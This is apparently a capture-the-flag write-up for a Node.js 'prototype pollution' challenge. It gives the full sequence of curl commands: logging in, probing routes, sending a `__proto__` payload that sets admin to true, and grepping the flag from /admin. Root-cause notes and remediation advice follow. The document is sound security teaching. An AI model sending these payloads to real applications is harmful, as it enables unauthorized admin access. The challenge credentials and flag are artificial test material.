# NodeJS Academy: Prototype Pollution

![Category](https://img.shields.io/badge/Category-Web-2563eb?style=flat-square)
![Runtime](https://img.shields.io/badge/Runtime-Node.js-16a34a?style=flat-square)
![Bug](https://img.shields.io/badge/Bug-Prototype%20Pollution-dc2626?style=flat-square)
![Impact](https://img.shields.io/badge/Impact-Admin%20Bypass-f59e0b?style=flat-square)

> Objective: use a profile update endpoint to pollute object prototypes and bypass the admin authorization check.

## Executive Summary

The application exposed a JSON profile update endpoint. Because user-controlled JSON was merged into a server-side object without filtering dangerous keys, a `__proto__` payload could inject `admin: true` into the prototype chain.

After pollution, a naive authorization check such as `if (user.admin)` treated the student session as admin and exposed the flag.

## Attack Path

| Step | Action | Result |
| --- | --- | --- |
| 1 | Log in with test account | Valid session cookie |
| 2 | Explore dashboard | `/admin` link discovered |
| 3 | Inspect profile page | `POST /api/profile` found |
| 4 | Send `__proto__` JSON | Prototype polluted |
| 5 | Visit `/admin` | Authorization bypassed |
| 6 | Grep flag | Flag recovered |

## 1. Authentication

Credentials:

```text
etudiant / csia2026
```

```bash
curl -i -c cookies.txt -b cookies.txt \
  -d "username=etudiant&password=csia2026" \
  https://csia-ctf26-prototype-pollution.chals.io/login
```

Successful login:

```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: connect.sid=...
```

Dashboard request:

```bash
curl -s -L -b cookies.txt \
  https://csia-ctf26-prototype-pollution.chals.io/dashboard \
  | tee dash.html
```

Interesting link:

```html
<a href="/admin">Admin</a>
```

## 2. Route Discovery

```bash
for p in dashboard profile update settings api/profile api/update api/settings courses admin flag debug; do
  echo -e "\n=== /$p ==="
  curl -s -i -L -b cookies.txt \
    https://csia-ctf26-prototype-pollution.chals.io/$p | head -80
done
```

The `/profile` page revealed the update endpoint:

```text
POST /api/profile
Content-Type: application/json
```

Client-side request pattern:

```js
const res = await fetch('/api/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
});
```

## 3. Exploitation

Prototype pollution payload:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

Request:

```bash
curl -i -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}' \
  https://csia-ctf26-prototype-pollution.chals.io/api/profile
```

Why this works:

```text
user.admin does not exist directly
JavaScript checks the prototype chain
polluted prototype contains admin=true
authorization check becomes true
```

## 4. Flag Retrieval

```bash
curl -s -b cookies.txt \
  https://csia-ctf26-prototype-pollution.chals.io/admin \
  | grep -oE 'CSIA\{[^}]+\}'
```

Output:

```text
CSIA{pr0t0typ3_p0llut10n_m4st3r}
```

## Flag

```text
CSIA{pr0t0typ3_p0llut10n_m4st3r}
```

## Root Cause Analysis

The vulnerable pattern was likely an unsafe merge of request JSON into a profile object:

```js
Object.assign(user.profile, req.body);
```

or a recursive merge helper:

```js
merge(user.profile, req.body);
```

Dangerous keys:

```text
__proto__
constructor
prototype
```

Risky authorization check:

```js
if (user.admin) {
  // admin access
}
```

Safer check:

```js
if (Object.hasOwn(user, "admin") && user.admin === true) {
  // admin access
}
```

## Remediation Matrix

| Weakness | Fix |
| --- | --- |
| Unsafe object merge | Use hardened merge logic |
| Dangerous prototype keys accepted | Block `__proto__`, `constructor`, `prototype` |
| Inherited property used for auth | Check own properties only |
| Generic objects for untrusted input | Use `Object.create(null)` |
| Dependency risk | Keep merge libraries patched |

